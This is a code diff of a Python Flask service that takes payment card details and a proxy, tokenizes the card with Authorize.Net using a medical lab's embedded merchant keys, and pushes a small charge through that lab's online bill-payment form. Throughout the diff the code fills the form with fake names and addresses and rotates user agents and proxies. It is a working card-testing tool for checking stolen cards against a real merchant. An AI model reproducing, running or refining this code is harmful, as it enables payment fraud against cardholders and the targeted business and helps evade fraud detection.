@@ -1,193 +1,159 @@
-import re
-import json
-import uuid
 from flask import Flask, request, jsonify
 import requests
 from fake_useragent import UserAgent, FakeUserAgentError
 
-try:
-    ua = UserAgent(use_cache_server=False)
-    user_agent = ua.random
-except FakeUserAgentError:
-    # Fallback user-agent if fetching fails
-    user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36"
-
 app = Flask(__name__)
-fake = Faker()
-ua = UserAgent()
 
-MERCHANT_NAME = "3c5Q9QdJW"
-CLIENT_KEY = "2n7ph2Zb4HBkJkb8byLFm7stgbfd8k83mSPWLW23uF4g97rX5pRJNgbyAe2vAvQu"
+def get_user_agent():
+    try:
+        ua = UserAgent(use_cache_server=False)
+        return ua.random
+    except FakeUserAgentError:
+        # Fallback user-agent string if fetching fails
+        return "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36"
 
-def clean_html_message(html_str):
-    if not html_str:
-        return ""
-
-    # Remove HTML tags
-    text = re.sub(r'<.*?>', '', html_str)
-    text = text.replace("\\n", " ").replace("\n", " ").strip()
-
-    # Remove annoying prefixes that ruin readability
-    for phrase in [
-        "Form error message",
-        "Payment was declined by Authorize.Net.",
-        "API: (2)",
-        "This transaction has been declined.",
-        "Form has not been submitted, please see the errors below."
-    ]:
-        text = text.replace(phrase, "")
-
-    # Clean extra spaces leftover
-    text = re.sub(r'\s+', ' ', text).strip()
-
-    # If empty after cleaning, fallback to original text stripped
-    if not text:
-        text = html_str.strip()
-
-    return text
-
-def format_proxy(proxy_str):
-    if proxy_str:
-        return {
-            "http": f"http://{proxy_str}",
-            "https": f"http://{proxy_str}"
-        }
-    return None
-
-def get_opaque_data(card_number: str, exp_month: str, exp_year: str, card_cvv: str, proxy_dict):
-    url = "https://api2.authorize.net/xml/v1/request.api"
+def get_opaque_data(card_number, expiration_date, card_code=None):
+    url = 'https://api2.authorize.net/xml/v1/request.api'
     headers = {
-        "Accept": "*/*",
-        "Content-Type": "application/json; charset=UTF-8",
-        "Origin": "https://avanticmedicallab.com",
-        "Referer": "https://avanticmedicallab.com/",
-        "User-Agent": ua.random
+        'Accept': '*/*',
+        'Content-Type': 'application/json; charset=UTF-8',
+        'Origin': 'https://avanticmedicallab.com',
+        'Referer': 'https://avanticmedicallab.com/',
+        'User-Agent': get_user_agent(),
     }
-    payload = {
+
+    data = {
         "securePaymentContainerRequest": {
             "merchantAuthentication": {
-                "name": MERCHANT_NAME,
-                "clientKey": CLIENT_KEY
+                "name": "3c5Q9QdJW",
+                "clientKey": "2n7ph2Zb4HBkJkb8byLFm7stgbfd8k83mSPWLW23uF4g97rX5pRJNgbyAe2vAvQu"
             },
             "data": {
                 "type": "TOKEN",
-                "id": str(uuid.uuid4()),
+                "id": "fake-token-id",  # you can generate or reuse token IDs here if needed
                 "token": {
                     "cardNumber": card_number,
-                    "expirationDate": f"{exp_month}{exp_year}",
-                    "cardCode": card_cvv
+                    "expirationDate": expiration_date
                 }
             }
         }
     }
 
-    r = requests.post(url, headers=headers, json=payload, proxies=proxy_dict, timeout=30)
-    data = json.loads(r.content.decode('utf-8-sig'))
-    if data.get("messages", {}).get("resultCode") == "Ok":
-        return data["opaqueData"]["dataValue"]
-    else:
-        raise Exception(f"Failed to get opaqueData: {data}")
+    if card_code:
+        data["securePaymentContainerRequest"]["data"]["token"]["cardCode"] = card_code
 
-def submit_payment(opaque_value: str, month: str, year: str, amount: str, proxy_dict):
-    url = "https://avanticmedicallab.com/wp-admin/admin-ajax.php"
+    response = requests.post(url, headers=headers, json=data)
+    response.raise_for_status()
+    return response.json()
+
+def submit_payment(opaque_descriptor, opaque_value, amount, proxy=None):
+    url = 'https://avanticmedicallab.com/wp-admin/admin-ajax.php'
+
     headers = {
-        "accept": "application/json, text/javascript, */*; q=0.01",
-        "origin": "https://avanticmedicallab.com",
-        "referer": "https://avanticmedicallab.com/pay-bill-online/",
-        "user-agent": ua.random,
-        "x-requested-with": "XMLHttpRequest"
+        'Accept': 'application/json, text/javascript, */*; q=0.01',
+        'Content-Type': 'multipart/form-data',
+        'Origin': 'https://avanticmedicallab.com',
+        'Referer': 'https://avanticmedicallab.com/pay-bill-online/',
+        'User-Agent': get_user_agent(),
+        'X-Requested-With': 'XMLHttpRequest',
     }
 
-    first_name = fake.first_name()
-    last_name = fake.last_name()
-    email = fake.email()
-    phone = f"({fake.random_int(200, 999)}) {fake.random_int(200, 999)}-{fake.random_int(1000, 9999)}"
-    city = fake.city()
-    state = "NY"
-    postal = fake.postcode()
-    address = fake.street_address()
-
+    # multipart/form-data boundary is handled by requests
     form_data = {
-        "wpforms[fields][1][first]": first_name,
-        "wpforms[fields][1][last]": last_name,
-        "wpforms[fields][17]": amount,
-        "wpforms[fields][2]": email,
-        "wpforms[fields][3]": phone,
-        "wpforms[fields][14]": "Test Data",
-        "wpforms[fields][4][address1]": address,
-        "wpforms[fields][4][city]": city,
-        "wpforms[fields][4][state]": state,
-        "wpforms[fields][4][postal]": postal,
-        "wpforms[fields][6]": f"$ {amount}",
-        "wpforms[fields][11][]": "By clicking on Pay Now button you have read and agreed.",
-        "wpforms[id]": "4449",
-        "wpforms[author]": "1",
-        "wpforms[post_id]": "3388",
-        "wpforms[authorize_net][opaque_data][descriptor]": "COMMON.ACCEPT.INAPP.PAYMENT",
-        "wpforms[authorize_net][opaque_data][value]": opaque_value,
-        "wpforms[authorize_net][card_data][expire]": f"{month}/{year}",
-        "wpforms[token]": "1bc9aacc38fe976790deb45fe856da53",
-        "action": "wpforms_submit",
-        "page_url": "https://avanticmedicallab.com/pay-bill-online/",
-        "page_title": "Pay Bill Online",
-        "page_id": "3388"
+        'wpforms[fields][1][first]': 'John',
+        'wpforms[fields][1][last]': 'Doe',
+        'wpforms[fields][17]': amount,
+        'wpforms[fields][2]': 'email@example.com',
+        'wpforms[fields][3]': '(123) 456-7890',
+        'wpforms[fields][14]': 'AddressLine',
+        'wpforms[fields][4][address1]': 'New York',
+        'wpforms[fields][4][city]': 'New York',
+        'wpforms[fields][4][state]': 'NY',
+        'wpforms[fields][4][postal]': '10001',
+        'wpforms[fields][6]': f'$ {amount}',
+        'wpforms[fields][11][]': 'By clicking on Pay Now button you have read and agreed to the policies set forth in both the Privacy Policy and the Terms and Conditions pages.',
+        'wpforms[id]': '4449',
+        'wpforms[author]': '1',
+        'wpforms[post_id]': '3388',
+        'wpforms[authorize_net][opaque_data][descriptor]': opaque_descriptor,
+        'wpforms[authorize_net][opaque_data][value]': opaque_value,
+        'wpforms[authorize_net][card_data][expire]': '',  # expiration date if needed
+        'wpforms[token]': 'fake-token',  # you can pass a token or leave as is
+        'action': 'wpforms_submit',
+        'page_url': 'https://avanticmedicallab.com/pay-bill-online/',
+        'page_title': 'Pay Bill Online',
+        'page_id': '3388',
     }
 
-    r = requests.post(url, headers=headers, files={k: (None, v) for k, v in form_data.items()}, proxies=proxy_dict, timeout=30)
-    return r.text
+    proxies = None
+    if proxy:
+        proxies = {
+            "http": f"http://{proxy}",
+            "https": f"http://{proxy}",
+        }
+
+    response = requests.post(url, headers=headers, data=form_data, proxies=proxies)
+    response.raise_for_status()
+    return response.json()
 
 @app.route('/pay', methods=['GET'])
 def pay():
-    cc = request.args.get("cc")
+    cc = request.args.get('cc')
+    proxy = request.args.get('proxy')
+    amount = request.args.get('amount', '0.10')
+
     if not cc:
-        return jsonify({"success": False, "error": "Missing required parameter: cc"}), 400
-
-    proxy_str = request.args.get("proxy")
-    amount = request.args.get("amount", "0.10")
+        return jsonify({"error": "Missing 'cc' parameter"}), 400
 
     try:
-        card_number, exp_month, exp_year, card_cvv = cc.split("|")
-    except Exception:
-        return jsonify({"success": False, "error": "Invalid cc format. Use: cardnumber|mm|yy|cvv"}), 400
+        # cc format: cardnumber|mm|yy|cvv
+        parts = cc.split('|')
+        card_number = parts[0]
+        month = parts[1]
+        year = parts[2]
+        card_code = parts[3] if len(parts) > 3 else None
+        expiration_date = f"{month}{year}"  # e.g. '0926'
 
-    proxies = None
-    if proxy_str:
-        proxies = {
-            "http": f"http://{proxy_str}",
-            "https": f"http://{proxy_str}"
-        }
+        # Step 1: get opaqueData token from Authorize.net
+        opaque_response = get_opaque_data(card_number, expiration_date, card_code)
+        opaque_data = opaque_response.get('opaqueData', {})
+        opaque_descriptor = opaque_data.get('dataDescriptor')
+        opaque_value = opaque_data.get('dataValue')
 
-    try:
-        opaque = get_opaque_data(card_number, exp_month, exp_year, card_cvv, proxies)
-        response_text = submit_payment(opaque, exp_month, exp_year, amount, proxies)
+        if not opaque_descriptor or not opaque_value:
+            return jsonify({"error": "Failed to get opaque data"}), 500
 
-        try:
-            response_json = json.loads(response_text)
-        except Exception:
-            return jsonify({
-                "success": False,
-                "charged_amount": f"${amount}",
-                "message": "Failed to decode response",
-                "raw_response": response_text
-            })
+        # Step 2: submit payment to site with opaque data
+        payment_response = submit_payment(opaque_descriptor, opaque_value, amount, proxy)
 
-        if response_json.get("success") == True:
-            msg_html = response_json.get("data", {}).get("confirmation", "")
-            message = clean_html_message(msg_html)
+        # Step 3: clean and parse the response message
+        message = ""
+        success = False
+
+        if payment_response.get("success") is True:
             success = True
+            message = "$" + amount + " Charged"
         else:
-            err_html = response_json.get("data", {}).get("errors", {}).get("general", {}).get("footer", "")
-            message = clean_html_message(err_html)
-            success = False
+            # try to extract error message from response data
+            try:
+                errors = payment_response["data"]["errors"]["general"]["footer"]
+                import re
+                # strip html tags and decode entities
+                clean_msg = re.sub(r'<[^>]+>', '', errors)
+                message = clean_msg.strip()
+            except Exception:
+                message = "Payment Declined"
 
         return jsonify({
-            "success": success,
             "charged_amount": f"${amount}",
-            "message": message
+            "message": message,
+            "success": success,
+            "raw_response": payment_response
         })
 
     except Exception as e:
-        return jsonify({"success": False, "error": str(e)}), 500
+        return jsonify({"error": str(e)}), 500
+
 
 if __name__ == '__main__':
-    app.run(debug=True, port=5000)
+    app.run(debug=True)
